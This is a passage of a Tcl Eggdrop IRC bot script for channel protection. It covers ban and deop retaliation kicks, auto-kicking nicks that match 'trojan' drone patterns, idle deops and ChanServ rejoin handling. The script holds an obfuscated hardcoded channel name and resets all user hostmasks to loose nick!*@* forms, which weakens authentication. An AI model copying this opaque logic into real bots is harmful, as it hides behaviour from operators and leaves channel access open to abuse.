set banms [lindex $bancounte $banidx]
if {[getuser "config" XTRA "KCOUNTER"]=="ON"} {
append banms " 4K&#238;&#231;k\:1 \B7$kicks\B7"
}
return $banms
}
set cycidx 1
proc cyclemsg {} {
global cycidx cycle_random
set cycidx [incr cycidx]
if {$cycidx >= [llength $cycle_random]} {
set cycidx 1
}
set cyclemsg [lindex $cycle_random $cycidx]
}
proc ban_chk {nick uhost handle channel mchange bhost} {
global botnick botname ps quick notb notc bannick ban-time igflood invme ex_flood kickconter
set mhost [string range $bhost [string first "@" $bhost] end]
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {[info exists invme($mhost)]} {
catch { unset invme($mhost) }
}
if {[info exists ex_flood($mhost)]} {
catch { unset ex_flood($mhost) }
}
if {![isop $botnick $channel]} { return 0 }
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
if {$banmask == "*!*@*"} {
set banmask "$nick!*@*"
}
if {$bhost == "*!*@*"} {
utimer [rand 4] [list unbanq $channel $bhost]
return 1
}
set cmode [getchanmode $channel]
if {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
return 1
}
}
}
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
if {$quick == "1"} {
putqck "KICK $channel $nick :$notc 1SeLF 4BaNNINg1 DeFeNsE REvERsINg [banmsg]"
} {
putsrv "KICK $channel $nick :$notc 1SeLF 4BaNNINg1 DeFeNsE REvERsINg [banmsg]"
}
}
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
} {
putserv "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b+b $bhost $banmask"
} {
putserv "mode $channel -b+b $bhost $banmask"
}
}
} {
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb 4SeLF.UnBaN $bhost"
} else {
putserv "mode $channel -kb SeLF.UnBaN $bhost"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b $bhost"
} else {
putserv "mode $channel -b $bhost"
}
}
}
return 1
}
foreach knick [chanlist $channel] {
if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
if {[matchattr $knick f]} {
if {$knick != $ps && $knick != $notb} { utimer [rand 4] [list unbanq $channel $bhost] }
if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*dal.net*" $nick] || [info exists igflood($nick)]} { return 1 }
}
if {$knick == $notb} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4Guardian1..! [banmsg]"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4Guardian.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {$knick == $ps} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4kazuya1..! [banmsg]"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4BHL.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {[matchattr $knick n]} {
if {$nick != $botnick} {
set bannick($nick) $banmask
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd ADmIN 4$knick1..! [banmsg]"
}
return 1
}
if {[matchattr $knick m]} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd MasTeR 4$knick1..! [banmsg]"
}
return 1
}
if {[matchattr $cflag E]} {
if {$nick == $botnick} {
set menforce [rand 4]
if {$menforce == 1} {
putsrv "KICK $channel $knick :$notc 1BaNnEd FRoM 4[string toupper $channel] [banms]"
} elseif {$menforce == 2} {
putsrv "KICK $channel $knick :$notc 1MaTcH BaNs FRoM 4[unsix $bhost] [banms]"
} elseif {$menforce == 3} {
putsrv "KICK $channel $knick :$notc 1FILTeR BaNs FRoM 4[unsix $bhost] [banms]"
} else {
putsrv "KICK $channel $knick :$notc 1ReFusEd LInK FRoM 4[string toupper $channel] [banms]"
}
} else {
if {[matchattr $nick n]} {
putsrv "KICK $channel $knick :$notc 4ADmIN1 BaNnEd 4OuT1..! [banmsg]"
} else {
if {[matchattr $nick m]} {
putsrv "KICK $channel $knick :$notc 4MasTeR1 BaNnEd 4OuT1..! [banmsg]"
} else {
if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
if {![matchattr $knick f]} {
set menforce [rand 5]
if {$menforce == 1} {
putsrv "KICK $channel $knick :$notc 1BaNnEd BY 4@$nick [banms]"
} elseif {$menforce == 2} {
putsrv "KICK $channel $knick :$notc 1MaTcH BaNs FRoM 4[unsix $bhost] [banms]"
} elseif {$menforce == 3} {
putsrv "KICK $channel $knick :$notc 1BaNnEd FRoM 4[string toupper $channel] [banms]"
} elseif {$menforce == 4} {
putsrv "KICK $channel $knick :$notc 1FILTeR BaNs FRoM 4[unsix $bhost] [banms]"
} else {
putsrv "KICK $channel $knick :$notc 1ReFusEd LInK FRoM 4[string toupper $channel] [banms]"
}
}
}
}
}
}
}
}
return 0
}
bind mode - * prot:deop
proc prot:deop {nick uhost handle channel mchange {opnick ""}} {
global botnick deopme ps invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it
set cflag "c$channel"
set cflag [string range $cflag 0 8]
set mode [lindex $mchange 0]
if {$opnick == ""} {
set opnick [lindex $mchange 1]
}
if {$mode == "-m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} {
killutimer [lindex $x 2]
}
}
catch {unset is_m($channel)}
if {![botisop $channel]} { return 0 }
if {[matchattr $cflag V]} {
foreach x [chanlist $channel] {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
}
}
}
return 0
}
if {$mode == "+k"} {
set lastkey $opnick
if {[matchattr $cflag K] && [matchattr $nick Z]} {
putlog "key change to $opnick"
setuser $cflag XTRA "CI" [zip $opnick]
saveuser
}
}
if {$mode == "-k"} {
catch { unset lastkey }
if {$nick != $botnick} {
set igflood($nick) "1"
}
return 0
}
if {$mode == "+m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} {
killutimer [lindex $x 2]
}
}
if {$nick == $botnick} {
if {![string match "*m*" [lindex [channel info $channel] 0]]} {
if {[string match "*+shared*" [channel info $channel]]} {
puthelp "NOTICE $channel :OnE MInUtE MoDeRaTe DuE tO FLoOd..!"
}
utimer 70 [list set_-m $channel]
if {[isutimer "TRAFFIC $channel"]} {
utimer 20 [list pub_nobot "*" "*" "*" $channel "*"]
return 0
}
}
} {
if {[isutimer "goback"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] }
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback }
}
utimer 2 del_nobase
return 0
}
utimer [expr 1800 + [rand 60]] [list set_-m $channel]
}
return 0
}
if {$mode == "+b"} {
if {$opnick == "*!*@heavy.join.flood.channel.temporary.moderate"} {
utimer 40 [list putlog "TRAFFIC $channel"]
if {$nick == $botnick} {
utimer 40 [list putserv "mode $channel -b *!*@heavy.join.flood.channel.temporary.moderate"]
if {[info exists is_m($channel)]} { return 0 }
if {$quick == "1"} {
putquick "mode $channel +m"
} {
putserv "mode $channel +m"
}
set is_m($channel) 1
return 0
}
}
ban_chk $nick $uhost $handle $channel $mchange $opnick
return 0
}
if {$mode == "-b"} {
if {[info exists is_ban($opnick$channel)]} {
catch {unset is_ban($opnick$channel)}
}
if {[isutimer "unbanq $channel $opnick"]} {
foreach x [utimers] {
if {[string match "*unbanq $channel $opnick*" $x]} {
killutimer [lindex $x 2]
}
}
}
foreach x [ignorelist] {
if {[lindex $x 0] == $opnick} {
unsetignore [lindex $x 0]
return 0
}
}
catch { killban $opnick }
return 0
}
if {$nick == $opnick} { return 0 }
if {$opnick == $botnick && $mode == "+o"} {
chk_on_op $channel
return 0
}
if {$mode == "+o" && [isop $botnick $channel]} {
if {[info exists op_it($opnick)]} {
catch {unset op_it($opnick)}
}
if {[matchattr $opnick O]} {
set cmode [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $opnick"
} {
puthelp "mode $channel -o $opnick"
}
return 0
}
if {[info exists unop($opnick)]} {
if {$nick == "ChanServ"} {
catch { unset unop($opnick) }
return 0
}
if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} {
return 0
}
utimer [expr 5 + [rand 10]] [list unallowed $channel $nick $opnick]
return 0
}
}
if {$mode == "-o"} {
foreach x [utimers] {
if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] }
}
if {$opnick == $botnick} {
if {[isutimer "DEOP $channel"]} { return 0 }
foreach x [utimers] {
if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] }
}
utimer 2 [list putlog "DEOP $channel"]
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![string match "*Guest*" $botnick]} {
if {![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
set deopme $nick

}
}
}
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip [lines "9MJu6/A2i8/0"]]} {
if {![string match "*+protectfriends*" [channel info $channel]]} {
putlog "!Log! CHaNOP <<$channel>>"
putsrv "ChanServ op $channel $botnick"
}
}
}
return 0
}
if {![isop $botnick $channel]} { return 0 }
if {[isutimer "deopprc*$opnick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$opnick*" $x]} {
putlog "!UnDeOp OR UnKIcK!"
catch { killutimer [lindex $x 2] }
}
}
}
if {$nick == "ChanServ" && [matchattr $opnick o]} {
voiceq $channel $opnick
return 0
}
if {$nick == "ChanServ"} {
set unop($opnick) "1"
return 0
}
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4kazuya1..! [banmsg]"
}
opq $channel $opnick
return 0
}
if {[matchattr $opnick n]} {
if {![info exists igflood($nick)]} {
putsrv "KICK $channel $nick :$notc 1ADmIN 4De@p1 GuaRd4..! [banmsg]"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick m]} {
if {![info exists igflood($nick)]} {
putsrv "KICK $channel $nick :$notc 1MasTeR 4De@p1 GuaRd1..! [banmsg]"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick o]} {
opq $channel $opnick
return 0
}
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4Guardian1..! [banmsg]"
}
opq $channel $opnick
return 0
}
}
}
proc unallowed {chan nick opnick} {
if {![botisop $chan]} { return 0 }
if {![isop $nick $chan]} { return 0 }
if {[isop $opnick $chan]} { return 0 }
putserv "mode $chan -ko 4ChanServ.UnaLLowEd $nick"
}
bind nick - * chk_nicks
proc chk_nicks {unick uhost hand chan newnick} {
global notc bannick botnick nick
if {$unick == $nick && $unick != $botnick} {
putsrv "NICK $nick"
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set hostmask "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
}
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "deopprc*$unick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$unick*" $x]} {
putlog "!UnDeOp!"
catch { killutimer [lindex $x 2] }
}
}
}
if {[string match "Guest*" $newnick]} {
if {[matchattr $unick f]} { return 0 }
if {[isop $newnick $chan]} {
utimer [expr 80 + [rand 20]] [list deopprc $chan $newnick]
return 0
}
}
if {[string match "*+trojan*" [channel info $chan]]} {
set bmask_check $newnick!$uhost
set bmask_host "*!*@[lindex [split $uhost @] 1]"
trojanchk $newnick $bmask_check $bmask_host $chan
}
if {[matchattr $newnick O] && [isop $newnick $chan]} {
set cmode [getchanmode $chan]
if {![string match "*k*" $cmode]} {
putserv "mode $chan -ko 4No@p.LIsT $newnick"
} {
putserv "mode $chan -o $newnick"
}
}
akick_chk $newnick $uhost $chan
spam_chk $newnick $uhost $hand $chan
return 0
}
set vern \0034B\003\0033\[\003\00310H\003\0033\]\003\0034L\003\017
proc msg_identify {nick uhost hand rest} {
global notc
set id [lindex $rest 0]
set password [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($id == "") || ($password == "")} {
puthlp "NOTICE $nick :$notc Usage: identify <nick> <password>"
return 0
}
putsrv "NickServ identify $id $password"
puthlp "NOTICE $nick :$notc Identify to $id"
return 0
}
proc pub_realnick {unick uhost hand chan rest} {
global notc keep-nick nick
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
set keep-nick 1
putsrv "NICK $nick"
return 0
}
proc rands {length} {
set chars \\^|_[]{}\\
set count [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
set toth [dezip [lines "9MJu6/A2i8/0"]]
proc pub_randnick {unick uhost hand chan rest} {
global notc keep-nick nick altnick botnick
if {$rest != ""} {
set keep-nick 0
set nickch "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]"
putsrv "NICK $nickch"
} {
if {$botnick != $nick && $botnick != $altnick} { return 0 }
set keep-nick 0
putsrv "NICK [rands 8]"
}
return 0
}
proc pub_altnick {nick uhost hand chan rest} {
global altnick keep-nick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set keep-nick 0
putsrv "NICK $altnick"
}
if {![string match "*cho_cho*" [timers]]} { timer 5 cho_cho }
bind raw - 305 not_away
proc not_away { from keyword arg } {
if {[isutimer "del_nobase"]} { utimer 1 del_nobase }
if {[isutimer "goback"]} { utimer 2 goback }
unsetignore "*!*@*"
}
bind raw - 404 ch_moderate
bind raw - 473 ch_invite
bind raw - 474 ch_banned
bind raw - 475 ch_key
bind raw - 478 ch_full
bind raw - 432 nickERROR
proc nickERROR { from keyword arg } {
global nick
set nick "BHL[unixtime]"
}
proc ch_moderate { from keyword arg } {
putlog "CANT SEND ON MODERATE!"
if {[isutimer "del_nobase"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase }
}
}
}
proc ch_invite { from keyword arg } {
global double joinme notc
set chan [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc $chan 4(+I)"
}
if {[string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "ChanServ invite $chan"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc ReMOVE $chan 4(+I)"
}
channel remove $chan
savechan
}
set joinme ""
set double 0
}
return
}
proc ch_banned { from keyword arg } {
global double joinme notc
set chan [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc $chan 4(+B)"
}
if {[string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "ChanServ invite $chan"
puthlp "ChanServ unban $chan"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc ReMovE $chan 4(+B)"
}
if {[string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "ChanServ invite $chan"
}
channel remove $chan
savechan
}
set joinme ""
set double 0
}
return 0
}
if {![string match "*czo_czo*" [timers]]} { timer 5 czo_czo }
proc ch_key { from keyword arg } {
global double joinme notc lastkey chankey
set chan [lindex $arg 1]
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc $chan 4(+K)"
}
if {[matchattr $cflag K]} {
puthlp "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
} {
puthlp "JOIN $chan"
}
if {[info exists lastkey]} {
puthlp "JOIN $chan :$lastkey"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc ReMovE $chan 4(+K)"
}
channel remove $chan
savechan
return 0
}
if {[string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "ChanServ invite $chan"
}
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "JOIN $chan :$chankey"
}
set joinme ""
set double 0
}
return 0
}
proc ch_full { from keyword arg } {
global double joinme notc botnick
set chan [lindex $arg 1]
if {[isop $botnick $chan]} {
set bans ""
set i 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set i [incr i]
}
}
putserv "MODE $chan -kbbbbb 4BaN.LIsT.FuLL $bans"
return 0
}
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc $chan 4(+L)"
}
if {[string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "ChanServ invite $chan"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthlp "NOTICE $joinme :$notc ReMOVE $chan 4(+L)"
}
channel remove $chan
savechan
}
set joinme ""
set double 0
}
return 0
}
if {$altnick == ""} {
set altnick [randstring 7]
}
set badwords ""
set advwords ""
proc config {} {
global nick owner nickpass altpass altnick realname owner kops my-ip banner cycle_random
global notc logstore cfgfile badwords advwords ban-time my-hostname kickclr awaybanner
if {[validuser "config"]} {
if {[getuser "config" XTRA "REALNAME"]!=""} {
set realname [dezip [getuser "config" XTRA "REALNAME"]]
} else {
set realname $owner
}
if {[getuser "config" XTRA "USERNAME"]!=""} {
set realname [dezip [getuser "config" XTRA "USERNAME"]]
}
if {[getuser "config" XTRA "NICK"]!=""} {
set nick [dezip [getuser "config" XTRA "NICK"]]
}
if {[getuser "config" XTRA "NICKPASS"]!=""} {
set nickpass [dezip [getuser "config" XTRA "NICKPASS"]]
}
if {[getuser "config" XTRA "ALTNICK"]!=""} {
set altnick [dezip [getuser "config" XTRA "ALTNICK"]]
}
if {[getuser "config" XTRA "ALTPASS"]!=""} {
set altpass [dezip [getuser "config" XTRA "ALTPASS"]]
}
if {[getuser "config" XTRA "BAN"]!=""} {
set banner [dezip [getuser "config" XTRA "BAN"]]
lappend cycle_random $banner
}
if {[getuser "config" XTRA "WEND"]!=""} {
set awaybanner [dezip [getuser "config" XTRA "WEND"]]
}
if {[getuser "config" XTRA "BANTIME"]!=""} {
set ban-time [getuser "config" XTRA "BANTIME"]
}
if {[getuser "config" XTRA "BADWORDS"]!=""} {
set badwords [getuser "config" XTRA "BADWORDS"]
}
if {$badwords == ""} {
set badwords "cibai bitch kimak memek kontol kanjut bangsat ngentot fuck peler lanciau bajingan vagina ngewe shit asshole anjing babi kampang naked slut horny"
setuser "config" XTRA "BADWORDS" $badwords
}
if {[getuser "config" XTRA "ADVWORDS"]!=""} {
set advwords [getuser "config" XTRA "ADVWORDS"]
}
if {$advwords == ""} {
set advwords "http www join klik click"
setuser "config" XTRA "ADVWORDS" $advwords
}
if {[getuser "config" XTRA "KOPS"]!=""} {
set kops "T"
}
if {[getuser "config" XTRA "KCLR"]!=""} {
set kickclr "T"
}
if {[getuser "config" XTRA "VHOST"]!=""} {
set my-hostname [getuser "config" XTRA "VHOST"]
set my-ip [getuser "config" XTRA "VHOST"]
}
if {[getuser "config" XTRA "LOGCHAN"]!=""} {
putlog "!Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
set logstore "${cfgfile}.log"
logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore
}
} else {
adduser "config" ""
chattr "config" "-hp"
}
foreach x [userlist] {
chattr $x -Q
if {$x != "config" && $x != "AKICK"} {
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set hostmask "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
if {![validuser "AKICK"]} {
set hostmask "telnet!*@*"
adduser "AKICK" $hostmask
chattr "AKICK" "-hp"
chattr "AKICK" "K"
}
if {![validuser $owner]} {
set hostmask "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
}
saveuser
}
utimer 1 {config}
utimer 2 {seen}
## public trojan auto kick -- start
set banmask {
"Zenia?*" "wonaq*" "Zoe?*" "yagosix*" "Zilya*" "Briana?*" "EreaserT?*" "helo?*" "samucew?*" "liza?*" "Xenia?*" "Xylia?*" "Xandra?*" "Willa?*"
"Wendy?*" "Vicky?*" "Vivian?*" "Valora?*" "Vanessa?*" "Valda?*" "Ula?*" "UmaSharon?*" "Rosa?*" "Ruby?*" "Rita?*" "Reis?*" "Rae?*" "Rachel?*"
"Queen?*" "Peggy?*" "Pamela?*" "Olivia?*" "Olga?*" "Nicole?*" "Naomi?*" "Natalie?*" "Nora?*" "Nina?*" "Nova?*" "Nadia?*" "MisS*?*" "MiSs*?*"
"Mimi?*" "Maia?*" "Mary?*" "Melody?*" "Mimi?*" "MiSs_7ala?*" "lautaro?*" "Myra?*" "My9?*" "Linda?*" "Lisa?*" "Lolita?*" "Lynn?*" "Laura?*"
"Lara?*" "Kara?*" "Kassia?*" "Kyle?*" "Kali?*" "Kacey?*" "Katrina?*" "Janet?*" "Jewel?*" "Joanna?*" "Juliet?*" "Julie?*" "Ida?*" "Idona?*"
"Isabel?*" "Iris?*" "Ivana?*" "Ivory?*" "Hunter?*" "Holly?*" "Helga?*" "Haley?*" "Gloria?*" "Gilda?*" "Gale?*" "Faith?*" "Emily?*" "Evelyn?*"
"Eve?*" "Erika?*" "Eliza?*" "Eden?*" "Ebony?*" "Donna?*" "Dora?*" "Doris?*" "Diana?*" "Danielle?*" "Daria?*" "Damita?*" "Camille?*" "Cara?*"
"Carla?*" "Carmen?*" "Clarissa?*" "Chelsea?*" "Caitlin?*" "Bettina?*" "Blenda?*" "Bridget?*" "Briana?*" "Bella?*" "Becky?*" "Barbra?*"
"Aldora?*" "Alysia?*" "altesse?*" "Amorita?*" "Aretina?*" "Ara?*" "April?*" "Apollo?*" "Anita?*"  "a7la?*"
}
bind join - * trojan:join
proc trojan:join {nick uhost hand chan} {
global botnick
if {[string match "*+trojan*" [channel info $chan]]} {
if {![botisop $chan] || [matchchanattr $hand f $chan]} {
return 0
}
if {$nick == $botnick} {
return 1
} else {
set bmask_check $nick!$uhost
set bmask_host "*!*@[lindex [split $uhost @] 1]"
trojanchk $nick $bmask_check $bmask_host $chan
}
}
}
bind nick - * trojan:nick
proc trojan:nick {nick uhost hand chan nnick} {
global botnick
if {[string match "*+trojan*" [channel info $chan]]} {
if {![botisop $chan] || [matchchanattr $hand f $chan] || [isop $nick $chan] || [isvoice $nick $chan]} {
return 0
}
if {$nnick == $botnick} {
return 1
} else {
set bmask_check $nnick!$uhost
set bmask_host "*!*@[lindex [split $uhost @] 1]"
trojanchk $nnick $bmask_check $bmask_host $chan
}
}
}
proc trojanchk {nick bmask_check bmask_host chan} {
global banmask bmask_time bmask_reason bmask_notify tjidx notc
foreach bmask $banmask {
if {[string index $bmask_check 0] != "~"} { return 0 }
if {[string match [string tolower $bmask] [string tolower $bmask_check]]} {
if {[botisop $chan]} {
if {$tjidx == 18} {
set tjidx 1
}
trojankick $nick $bmask_host $chan
}
}
}
}
set tjidx 1
proc trojankick {nick bmask_host chan} {
global tjidx notc bannick botnick
set bannick($nick) "$bmask_host"
if {$tjidx == 1} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$tjidx == 2} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 DRonE TRoJaN [banmsg]"
} elseif {$tjidx == 3} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$tjidx == 4} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 Ups WRoNg WaY [banmsg]"
} elseif {$tjidx == 5} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 DonT EnTeReD 4[string toupper $chan] [banms]"
} elseif {$tjidx == 6} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 InTeRcEpT [banmsg]"
} elseif {$tjidx == 7} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 G.o.T.c.H.a [banmsg]"
} elseif {$tjidx == 8} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 NEgaTIvE HoUsToN [banmsg]"
} elseif {$tjidx == 9} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 gRoUndEd [banmsg]"
} elseif {$tjidx == 10} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 AnTIcIpaTEd [banmsg]"
} elseif {$tjidx == 11} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$tjidx == 12} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$tjidx == 13} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$tjidx == 14} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 sMoosHINg ReLaY TaBLe [banmsg]"
} elseif {$tjidx == 15} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$tjidx == 16} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$tjidx == 17} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 FakE NIcKNaMe [banmsg]"
} elseif {$tjidx >= 18} {
putserv "KICK $chan $nick :$notc !4Tr&#244;j&#226;4N!10 Unable to resolve4 $nick [banms]"
set tjidx 0
}
incr tjidx
return 0
}
## public trojan auto kick -- stop
## public auto deop @ps idle -- start
setudef flag noidle
proc idlewhois { } {
global botnick
foreach chan [channels] {
if {[string match "*+noidle*" [channel info $chan]]} {
foreach person [chanlist $chan] {
if {$person != $botnick && [isop $person $chan] && ![matchattr $person b]} {
putserv "WHOIS $person $person"
}
}
}
}
if {![string match "*idlewhois*" [timers]]} {
timer 5 idlewhois
}
}
#if {![string match "*idlewhois*" [timers]]} {
#   timer 5 idlewhois
#}
#bind raw - 317 idledeop
proc idledeop {nick int arg} {
global notc ps botnick
foreach chan [channels] {
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set idletime [getuser $cflag XTRA "NOIDLE"]
set nick [lindex $arg 1]
set idle [lindex $arg 2]
set minutesidle [expr $idle / 60]
if {[string match "*+noidle*" [channel info $chan]]} {
if {[onchan $nick $chan] && [isop $nick $chan] && ![matchattr $nick Z] && [string tolower $nick] != [string tolower $botnick]} {
if {$minutesidle > $idletime} {
putsrv "MODE $chan -ok $nick 4too.much.idle"
putsrv "NOTICE $nick :$notc Took op from you! on $chan (too much idle)"
}
}
}
}; return 0
}
bind pub n `+noidle pub_+noidle
bind pub n `-noidle pub_-noidle
proc pub_+noidle {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +noidle <minutes>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cant use null"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +noidle }
setuser $cflag XTRA "NOIDLE" $rest
puthelp "NOTICE $nick :$notc idle nick deop $chan $rest minutes"
saveuser
}
proc pub_-noidle {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
